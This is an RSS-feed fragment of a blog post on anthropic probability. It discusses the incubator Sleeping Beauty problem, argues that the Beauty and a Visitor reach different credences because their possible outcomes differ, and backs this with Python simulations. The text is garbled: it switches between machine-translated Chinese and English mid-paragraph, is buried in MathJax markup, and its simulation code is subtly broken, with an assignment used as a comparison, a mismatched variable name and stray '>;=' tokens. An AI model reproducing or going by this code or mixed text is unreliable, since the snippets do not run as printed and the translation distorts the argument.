style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mn MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">_</span></span></span></span></span></span></span></p><p>看到旁观者进入她的房间也不能为这位美女提供任何关于抛硬币结果的新证据，因为在正面和反面的结果中，她的房间被参观的机会恰好是 50%。</p><p>这导致了一个看似矛盾的情况。在同一个实验中，访客对 Heads 的信任度与 Beautie 的信任度不同。</p><blockquote><p>访客：这个随机选择的房间不是空的。结果硬币正面朝上的概率是 1/3。</p><p>美女：从我的角度来看并非如此！我仍然相信它是1/2，因为无论是我的存在，还是你的来访，都没有给我任何相关的新证据。不过，你能查一下是不是1号房间吗？</p><p>访客：让我看看... [检查门另一侧的标签]哦，是的，确实是 1 号房间。而且无论如何它都会被填满，我同意正面的概率只是 1/ 2.</p><p>美人：不，不是的。现在我知道这是 1 号房间，我相信正面朝上的概率是 2/3，因为当硬币是正面朝上时，我在 1 号房间的可能性是 2/3！</p></blockquote><h3>解决分歧</h3><p>看来这里肯定有人是错的。如果是美女的话，她是对的，那么她必须拥有一些奇怪的第一人称心灵力量，使她能够获得一些原本无法获得的东西，<i><strong> </strong></i>证据。</p><p>但这种情况并非如此。事实上，美女和访客都推理正确！这是用 python 编写的重复实验的模拟。 incubator() 函数的实现取自<a href="https://www.lesswrong.com/posts/HQFpRWGbJxjHvTjnw/anthropical-motte-and-bailey-in-two-versions-of-sleeping#Incubator_version_of_Sleeping_Beauty">此处。</a></p><p>游客：</p><pre> <code>coin_guess = [] for n in range(100000): rooms, coin = incubator() visitor_room_select = 1 if random.random() >;= 0.5 else 2 visitor_sees_any_beauty = visitor_room_select in rooms.values() if visitor_sees_any_beauty: coin_guess.append(coin == &#39;Heads&#39;) coin_guess.count(True)/len(coin_guess) # 0.33294271180120916</code></pre><p>访客，1 号房间：</p><pre> <code>coin_guess = [] for n in range(100000): room, coin = incubator() visitor_room_select = 1 if random.random() >;= 0.5 else 2 if visitor_room_select == 1: visitor_sees_any_beauty = visitor_room_select in rooms.values() if visitor_sees_any_beauty : coin_guess.append(coin == &#39;Heads&#39;) coin_guess.count(True)/len(coin_guess) # 0.5022478869862329</code></pre><p>美丽：</p><pre> <code>coin_guess = [] for n in range(100000): rooms, coin = incubator() visitor_room_select = 1 if random.random() >;= 0.5 else 2 visitor_sees_this_beauty = visitor_room_select = rooms[&#39;my_room&#39;] if visitor_sees_this_beauty: coin_guess.append(coin == &#39;Heads&#39;) coin_guess.count(True)/len(coin_guess) # 0.50111</code></pre><p>美容室1：</p><pre> <code>coin_guess = [] for n in range(100000): rooms, coin = incubator() visitor_room_select = 1 if random.random() >;= 0.5 else 2 if visitor_room_select == 1: visitor_sees_this_beauty = visitor_room_select == rooms[&#39;my_room&#39;] if visitor_sees_this_beauty: coin_guess.append(coin == &#39;Heads&#39;) coin_guess.count(True)/len(coin_guess) # 0.663950412781533</code></pre><p> How can it be?</p><p> When the Visitor looks into the room, there is a possibility to see that it&#39;s empty. Which is not the case for the Beauty herself, as she can&#39;t possibly witness her own absence. Outcome Heads &amp; Room 2 doesn&#39;t exist for her, as it does for the Visitor.</p><p> Moreover, on Tails outcome, the Visitor will always see a Beauty in the room. However, for each Beauty created on Tails, there is only 50% chance to see the visitor. As a result, the visitor observes the outcome &quot; <i>any</i> Beauty was seen&quot;, while the Beauty herself observes the outcome &quot; <i>this particular</i> Beauty was seen&quot;. Such difference in observed and possible outcomes naturally leads to different probability estimates.</p><p> If this still doesn&#39;t feel intuitive, you can remind yourself <a href="https://www.lesswrong.com/posts/uEP3P6AuNjYaFToft/conservation-of-expected-evidence-and-random-sampling-in#The_metaphysics_of_existence_vs_having_a_blue_jacket">why is it possible in principle to guess the result of coin toss better than chance</a> in this setting. Both the Beauty and the Visitor can do it only in some subset of the coin tosses - when they have some extra evidence. And these subsets are different for them.</p><p> For the Visitor, it&#39;s when a Room, randomly selected for the visit, contains a Beauty</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="N(Beauty In Visited Room) < N(All)"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">e</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">a</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">u</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.519em; padding-right: 0.006em;">y</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">n</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.186em;">V</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">i</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">s</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">i</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">e</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">d</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">R</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">m</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">&lt;</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p> But not when it&#39;s Room 1:</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="N(BeautyInRoom1) = N(All)"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">e</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">a</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">u</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.519em; padding-right: 0.006em;">y</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">n</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">R</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">m</span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span><br><br> But for the Beauty it&#39;s when she is in Room 1:</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="N(This Is Room 1) < N(All)"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.12em;">T</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">h</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">i</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">s</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">s</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">R</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">m</span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">&lt;</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p> Once again, this isn&#39;t because the Beauty&#39;s first-person perspective as a participant in the experiment has some mystical properties that the Visitor can not duplicate. It&#39;s quite easy to put the Visitor in the exact same epistemic situation. All we need to do is modify the setting of the experiment a bit, so that the possible outcomes for the Visitor were the same as for the Beauty herself. Like that:</p><blockquote><p> <i>You are an observer in the incubator sleeping beauty experiment. You do not know the result of a coin toss but you were brought into a room randomly selected among the ones where there is a Beauty.硬币正面朝上的概率是多少？ What&#39;s the probability that the coin landed Heads if you know that this is Room 1?</i></p></blockquote><p> Now, due to the experiment design, the visitor was certain to expect to see a Beauty in the Room.</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="N(Beauty In Visited Room) = N(All)"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">e</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">a</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">u</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.519em; padding-right: 0.006em;">y</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">n</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.186em;">V</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">i</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">s</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">i</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">e</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">d</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">R</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">m</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p> But information about whether they were brought in Room 1 becomes valuable. After all it happens twice as likely on Heads than on Tails</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="N(This Is Room 1) < N(All)"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.12em;">T</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">h</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">i</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">s</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">s</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">R</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">o</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">m</span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">&lt;</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">N</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">l</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><h3> No need to trouble the Beauty</h3><p> At this moment we do not even need a Beauty in a room.  We can put a mannequin or any other object, or just mark a room in any way that the Visitor will recognize. The same disagreement that the Beauty had with the Visitor can be recreated with two Visitors with different possible outcomes: one was brought to a random room and seen that it was marked, and the other one, who was supposed to be brought in one of the marked rooms in the first place.</p><p> There is nothing special about Beauty&#39;s perspective. No pshychic powers, no cosciousness magic. All the weirdness of her creation process just contributes to what possible outcomes she is able to have. In fact, she is a Visitor who was supposed to be brought to a marked Room and who can&#39;t notice not being brought into the Room. Everything probability relevant is determined by these possible outcomes and so there is no need to talk about anything else.</p><p> But if everything is so simple, if anthropics is just basic probability theory with no special case for consciousness why do we keep encountering anthropic paradoxes? This is a fair question and my next post will be focused on answering it.</p><br/><br/> <a href="https://www.lesswrong.com/posts/xbQLwBAyP2KjZC4qS/antropical-probabilities-are-fully-explained-by-difference#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/xbQLwBAyP2KjZC4qS/antropical-probabilities-are-fully-explained-by-difference<guid ispermalink="false"> xbQLwBAyP2KjZC4qS</guid><dc:creator><![CDATA[Ape in the coat]]></dc:creator><pubDate> Thu, 09 Nov 2023 15:34:03 GMT</pubDate></item></channel></rss>